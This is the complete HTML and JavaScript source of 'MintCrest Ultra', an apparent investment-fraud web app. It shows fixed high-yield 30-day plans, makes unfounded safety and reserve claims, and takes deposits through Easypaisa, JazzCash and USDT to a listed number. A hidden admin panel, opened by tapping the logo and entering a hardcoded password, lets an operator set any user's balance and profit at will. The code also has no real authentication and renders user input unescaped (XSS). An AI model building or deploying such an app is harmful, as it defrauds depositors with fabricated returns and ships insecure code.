<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Ultra | Verified Global Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-main { background: linear-gradient(135deg, #0062ff 0%, #00d4ff 100%); }
        .grad-gold { background: linear-gradient(135deg, #78350f 0%, #d97706 100%); }
        .page { display: none; height: 100%; overflow-y: auto; padding-bottom: 120px; animation: fadeIn 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
        .nav-btn { filter: grayscale(1); opacity: 0.4; transition: 0.3s; }
        .active-tab { filter: grayscale(0); opacity: 1; color: #00d4ff; }
        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex flex-col items-center justify-center p-8">
        <div class="w-20 h-20 grad-main rounded-3xl mb-6 shadow-[0_0_50px_rgba(0,98,255,0.3)] animate-bounce"></div>
        <h1 onclick="adminTap()" class="text-4xl font-black mb-2 italic tracking-tighter">MINTCREST</h1>
        <p class="text-[10px] uppercase tracking-[0.3em] text-blue-400 mb-8">Global Asset Node</p>
        <div class="glass p-8 rounded-[3rem] w-full max-w-xs text-center border-t border-white/10">
            <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-4 rounded-2xl mb-4 text-center font-bold outline-none border border-white/10">
            <button onclick="login()" class="w-full grad-main py-4 rounded-2xl font-black uppercase text-xs shadow-lg">Access Dashboard</button>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 relative">
        
        <div id="p-home" class="page active-page p-6">
            <div class="flex justify-between items-center mb-6">
                <div><p class="text-[9px] opacity-50">NODE MEMBER</p><h2 class="font-black text-lg" id="v-user">User</h2></div>
                <div class="flex gap-2">
                    <button onclick="window.open('https://chat.whatsapp.com/YOUR_LINK')" class="bg-green-600 p-2 rounded-xl">🟢</button>
                    <button onclick="changePage('support')" class="bg-blue-600 p-2 rounded-xl text-[10px] font-bold">HELP</button>
                </div>
            </div>

            <div class="grad-main p-8 rounded-[2.5rem] mb-6 shadow-2xl relative overflow-hidden">
                <div class="absolute -right-10 -top-10 w-40 h-40 bg-white/10 rounded-full blur-3xl"></div>
                <p class="text-[10px] font-black opacity-80 uppercase">Secured Capital</p>
                <h2 class="text-4xl font-black" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex justify-between items-center border-t border-white/10 pt-4">
                    <div><p class="text-[8px] opacity-70 italic">LIVE PROFIT</p><p class="font-black text-cyan-200" id="v-profit">₨ 0</p></div>
                    <div class="text-right"><button onclick="copyRef()" class="bg-white/10 px-3 py-1 rounded-lg text-[8px] font-black uppercase">🔗 Copy Referral</button></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-3 mb-6">
                <button onclick="claimDailyBonus()" class="glass p-4 rounded-2xl text-[10px] font-black uppercase border-b-2 border-yellow-500">🎁 Daily Bonus</button>
                <button onclick="applyPromo()" class="glass p-4 rounded-2xl text-[10px] font-black uppercase border-b-2 border-cyan-500">🎟️ Promo Code</button>
            </div>

            <div class="glass p-5 rounded-[2rem] mb-6 border-l-4 border-blue-500">
                <div class="flex items-center gap-3 mb-2">
                    <div class="w-2 h-2 bg-blue-500 rounded-full animate-ping"></div>
                    <h3 class="text-[10px] font-black text-blue-400 uppercase">Trusted Security Shield</h3>
                </div>
                <p class="text-[9px] opacity-60 leading-relaxed">MintCrest V16 is backed by **$2.4M Liquidity Reserve**. All transactions are monitored for 100% safety. <span class="text-blue-400 underline" onclick="changePage('legal')">About Company</span></p>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass py-6 rounded-3xl font-black text-[10px] uppercase bg-white/5">Deposit</button>
                <button onclick="changePage('withdraw')" class="glass py-6 rounded-3xl font-black text-[10px] uppercase text-rose-500 bg-rose-500/5">Withdraw</button>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <h3 class="text-center font-black uppercase text-cyan-400 mb-6 italic tracking-widest">Asset Funding</h3>
            <div class="space-y-3 mb-6">
                <div onclick="selM('Easypaisa','03705519562')" class="glass p-4 rounded-2xl flex justify-between items-center border border-white/5"><span>Easypaisa</span><span class="text-[10px] font-black">0370...562</span></div>
                <div onclick="selM('JazzCash','0300XXXXXXX')" class="glass p-4 rounded-2xl flex justify-between items-center border border-white/5"><span>JazzCash</span><span class="text-[10px] font-black">0300...XXX</span></div>
                <div onclick="selM('Binance (USDT)','TRC20-ADDRESS')" class="glass p-4 rounded-2xl flex justify-between items-center border border-white/5"><span>Binance</span><span class="text-[10px] font-black text-yellow-500">TRC20</span></div>
            </div>
            <div id="dep-box" class="hidden glass p-6 rounded-[3rem] border-2 border-cyan-500/20">
                <p id="m-info" class="text-center text-[10px] font-black mb-4 text-cyan-400"></p>
                <input type="number" id="d-amt" placeholder="Amount (Min 200)" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold border border-white/10">
                <input type="text" id="d-tid" placeholder="TID / TRX ID" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center uppercase border border-white/10">
                <p class="text-[9px] mb-2 font-bold opacity-50">UPLOAD PROOF SCREENSHOT:</p>
                <input type="file" id="d-file" accept="image/*" class="w-full text-[10px] mb-4">
                <button onclick="subDep()" class="w-full grad-main py-4 rounded-2xl font-black text-[10px] uppercase shadow-lg">Confirm Deposit</button>
            </div>
        </div>

        <div id="p-legal" class="page p-6">
            <div class="glass p-8 rounded-[3rem]">
                <h2 class="font-black text-blue-400 mb-4 uppercase">Integrity & Policy</h2>
                <div class="space-y-4 text-[11px] opacity-70 leading-relaxed">
                    <p>**About MintCrest:** Established in 2024, MintCrest is a premier decentralized asset manager providing high-yield 30-day liquidity nodes. We ensure 100% capital safety through our encrypted vault system.</p>
                    <p>**Privacy Policy:** Your transaction data and personal info are encrypted and never shared. Screens/Proofs are auto-purged after manual audit.</p>
                    <p>**Terms:** Withdrawals are processed within 24 hours. Fixed 30-day cycles apply to all investment plans for market stability.</p>
                </div>
                <button onclick="changePage('home')" class="mt-8 text-[10px] font-black text-blue-400 underline uppercase">Return to Node</button>
            </div>
        </div>

        <div id="p-support" class="page p-6 text-center">
            <h3 class="font-black text-xl mb-8 uppercase italic">Help Desk</h3>
            <div class="space-y-4">
                <button onclick="window.open('https://wa.me/YOUR_NUMBER')" class="w-full glass p-6 rounded-3xl flex items-center justify-between">
                    <span class="font-bold">Contact Support</span><span class="text-green-500">WhatsApp</span>
                </button>
                <button onclick="window.open('https://chat.whatsapp.com/YOUR_GROUP')" class="w-full glass p-6 rounded-3xl flex items-center justify-between">
                    <span class="font-bold">Join Community</span><span class="text-blue-400">Join Now</span>
                </button>
            </div>
        </div>

        <div id="p-invest" class="page p-6"><div id="plans-list" class="space-y-3 pb-10"></div></div>
        <div id="p-activity" class="page p-6"><div id="user-history" class="space-y-3 pb-10"></div></div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000814] z-[5000] hidden overflow-y-auto p-6">
        <div class="flex justify-between items-center mb-8 border-b border-white/10 pb-4">
            <h2 class="text-xl font-black text-cyan-400 italic uppercase">Admin Command Node</h2>
            <button onclick="closeAdm()" class="bg-rose-600 px-4 py-1 rounded-lg text-[9px] font-black uppercase">Close</button>
        </div>
        <div class="glass p-5 rounded-2xl mb-8">
            <p class="text-[9px] font-black mb-3 text-cyan-400">DIRECT USER CONTROL</p>
            <input type="text" id="adm-u" placeholder="Exact Username" class="w-full bg-white/5 p-3 rounded-xl text-xs mb-2 border border-white/10 outline-none">
            <input type="number" id="adm-v" placeholder="Amount Value" class="w-full bg-white/5 p-3 rounded-xl text-xs mb-3 border border-white/10 outline-none">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="editU('balance')" class="grad-main py-2 rounded-lg text-[8px] font-black">SET BALANCE</button>
                <button onclick="editU('profit')" class="grad-gold py-2 rounded-lg text-[8px] font-black">SET PROFIT</button>
            </div>
        </div>
        <div id="adm-reqs" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-6 flex justify-around items-center fixed bottom-0 w-full z-[200] rounded-t-[3rem] border-t border-white/10">
        <button onclick="changePage('home')" id="n-home" class="nav-btn text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="nav-btn text-2xl">📜</button>
        <button onclick="changePage('wallet')" id="n-wallet" class="nav-btn text-2xl">📥</button>
    </nav>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg",
            authDomain: "investment-84f4e.firebaseapp.com",
            projectId: "investment-84f4e",
            storageBucket: "investment-84f4e.firebasestorage.app",
            messagingSenderId: "975293889308",
            appId: "1:975293889308:web:6d034a99cc966c75ff58d9"
        };
        firebase.initializeApp(firebaseConfig); 
        const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0; let curM = '';

        const plans = [];
        for(let i=1; i<=25; i++) {
            plans.push({ n: `Master Fleet ${i} (30D)`, p: 200 + (i-1)*500, r: (1.5 + i*0.5).toFixed(1) });
        }

        async function login() {
            const n = document.getElementById('user-name').value.trim(); if(!n) return;
            const ref = db.collection("users").doc(n); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: n, balance: 0, profit: 0, lastB: 0, lastP: 0, ref: 'MC-'+Math.floor(Math.random()*9999) });
            user = (await ref.get()).data();
            document.getElementById('v-user').innerText = n;
            document.getElementById('auth-ui').style.display='none';
            document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            startSync(n); renderPlans();
        }

        async function claimDailyBonus() {
            if(Date.now() - (user.lastB || 0) < 86400000) return alert("Come back in 24 hours, sweetie! 😘");
            await db.collection("requests").add({ user: user.name, type: "Bonus Request", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ lastB: Date.now() });
            alert("Sent! Admin will verify. 🎁");
        }

        async function applyPromo() {
            const code = prompt("Enter Code:"); if(!code) return;
            if(Date.now() - (user.lastP || 0) < 86400000) return alert("Limit: 1 Promo per day! 😘");
            await db.collection("requests").add({ user: user.name, type: "Promo: "+code, status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ lastP: Date.now() });
            alert("Request Submitted! 🎟️");
        }

        function copyRef() {
            const link = window.location.href + "?ref=" + user.ref;
            navigator.clipboard.writeText(link); alert("Referral Link Copied! 🔗");
        }

        function selM(m, a) { curM = m; document.getElementById('dep-box').classList.remove('hidden'); document.getElementById('m-info').innerText = `SEND TO ${m}: ${a}`; }

        async function subDep() {
            const a = document.getElementById('d-amt').value; const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(a < 200 || !t || !f) return alert("Error: Complete all fields! 😘");
            const sRef = storage.ref(`proofs/${Date.now()}_${user.name}`); await sRef.put(f);
            const url = await sRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: url, type: "Deposit ("+curM+")", status: "pending", time: Date.now() });
            alert("Assets Syncing! Wait for approval. ✨"); location.reload();
        }

        function startSync(n) {
            db.collection("users").doc(n).onSnapshot(d => { user = d.data(); document.getElementById('v-bal').innerText = "₨ "+(user.balance||0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ "+(user.profit||0).toLocaleString(); });
            db.collection("requests").where("user", "==", n).orderBy("time", "desc").limit(10).onSnapshot(s => {
                const l = document.getElementById('user-history'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between text-[10px] uppercase font-bold"><span>${x.type}</span><span class="${x.status === 'pending' ? 'text-yellow-500' : 'text-green-500'}">${x.status}</span></div>`; });
            });
        }

        function renderPlans() {
            const l = document.getElementById('plans-list'); l.innerHTML = '<h3 class="font-black text-cyan-400 uppercase text-center mb-6 italic tracking-tighter">Verified 30-Day Cycles</h3>';
            plans.forEach(p => { l.innerHTML += `<div class="glass p-6 rounded-[2rem] flex justify-between items-center"><div class="text-left"><h4 class="font-black text-[10px] uppercase">${p.n}</h4><p class="text-[9px] text-blue-400 font-bold">${p.r}% Profit</p></div><div class="font-black text-xs">₨ ${p.p}</div></div>`; });
        }

        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Auth:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdm() { document.getElementById('admin-panel').classList.add('hidden'); }
        async function editU(f) { const u = document.getElementById('adm-u').value; const v = parseInt(document.getElementById('adm-v').value); await db.collection("users").doc(u).update({ [f]: v }); alert("Node Updated!"); }

        function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const l = document.getElementById('adm-reqs'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-5 rounded-2xl border border-white/5"><p class="text-[10px] font-black uppercase text-cyan-400">${x.user}</p><p class="text-[9px] font-bold mb-3">${x.type} | Amt: ${x.amount || 0} | TID: ${x.tid || 'N/A'}</p>${x.proof ? `<a href="${x.proof}" target="_blank" class="block bg-cyan-600 text-center py-2 rounded-xl text-[9px] font-black mb-3 uppercase">View Proof Screenshot</a>` : ''}<div class="flex gap-2"><button onclick="hnd('${d.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 grad-main py-3 rounded-xl text-[9px] font-black">APPROVE</button><button onclick="hnd('${d.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-rose-600 py-3 rounded-xl text-[9px] font-black">REJECT</button></div></div>`; });
            });
        }

        async function hnd(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved') {
                if(type.includes("Bonus") || type.includes("Promo")) { const b = parseInt(prompt("Amount to add:")); await ref.update({ balance: (d.data().balance||0) + b }); }
                else if(type.includes("Dep")) await ref.update({ balance: (d.data().balance||0) + amt });
            }
            await db.collection("requests").doc(id).update({ status: act });
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p).classList.add('active-tab'); }
    </script>
</body>
</html>
